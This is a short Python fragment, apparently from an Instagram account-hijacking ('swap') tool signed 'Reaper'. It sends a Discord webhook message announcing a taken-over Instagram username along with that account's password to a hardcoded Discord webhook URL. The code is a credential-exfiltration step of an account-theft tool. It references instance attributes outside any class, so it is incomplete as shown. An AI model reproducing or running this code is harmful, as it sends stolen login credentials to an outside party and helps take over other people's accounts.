import requests 
by='''
[👁] cyber.reaper
'''
Webhook = "https://discord.com/api/webhooks/874210942693548102/RSA0kBsLlQbO0XEM_CdTSbDsBEH2xfCByGkPfZsNWl7PZ727YA2jOckBGRzEkGU1zWan"
data = {}
data["embeds"] = [
            {
                #"title" : f"Details...",
                "description" : f"**``fucked``** **[@{self.username}](https://instagram.com/{self.user})**\n***`password : {self.password}| claimed By Reaper`***",
                #"color": 2895667,
                "thumbnail" : {
                    "url": "https://i.pinimg.com/originals/70/56/56/705656e8c01d3668bc496bef826a21f6.gif"},
        
                "footer" : {
                "text": f'\t\t By  Reaper',
                #"icon_url": "https://cdn.discordapp.com/attachments/873022739349381173/873507948700262430/ezgif.com-gif-maker.gif"
                    
                },
                "author" :{
                    "name" : "Red eye  V0.1 Swap"
                }
                
            }
        ]
requests.post(Webhook, json=data)
